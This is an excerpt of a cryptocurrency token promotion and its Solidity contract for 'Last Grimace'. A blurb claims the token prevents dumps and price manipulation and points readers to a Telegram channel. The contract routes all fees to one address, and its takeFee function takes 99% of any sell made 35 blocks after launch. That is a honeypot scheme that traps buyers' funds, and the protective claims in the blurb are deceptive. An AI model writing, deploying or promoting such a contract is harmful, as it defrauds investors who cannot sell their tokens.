...
Last Grimace is a community token with a systematic supply circulation, preventing dumps and whales from manipulating prices.
Telegram - https://t.me/lastgrimace

Please wait for contract to be pinned at chat, we have antibot measures.
...
contract LastGrimace is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Last Grimace";
    string constant _symbol = "LastGrimace";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xAda16C20158AA7731217d300C2ADaAaEDd69C074;
        teamFeeReceiver = 0xAda16C20158AA7731217d300C2ADaAaEDd69C074;
        utilityFeeReceiver = 0xAda16C20158AA7731217d300C2ADaAaEDd69C074;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 35 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
